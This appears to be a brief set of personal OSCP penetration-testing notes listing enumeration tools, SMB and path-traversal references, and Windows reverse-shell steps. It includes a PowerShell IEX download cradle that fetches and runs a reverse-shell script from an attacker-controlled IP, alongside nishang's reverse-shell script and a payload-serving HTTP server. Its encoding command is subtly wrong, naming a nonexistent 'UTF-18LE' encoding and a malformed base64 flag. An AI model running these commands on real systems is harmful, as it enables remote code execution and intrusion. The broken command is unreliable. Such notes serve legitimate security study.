# oscpNotes

WEB

ENUMERATION
gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

WINDOWS


LFI
https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/


SMB
smbmap -u USER -p PASSWORD -d DOMAIN -H ip

SHELLS
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .

ENUMERATION

JAWS --> https://github.com/411Hall/JAWS.git

DOWNLOAD SHELL POWERSHELL

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/reverse.ps1')  (may need to escape quotes)
AVOID BAD CHARACTERS --> convert to windows file format
iconv -t UTF-18LE | base64-w0 

LINUX




USEFULL COMMANDS
tcpdump -i tun0 icmp
python -m SimpleHTTPServer 80


USEFULL FRAMEWORKS
GIT
nishang
JAWS  --> enumeration
APT
gobuster
mdbtools

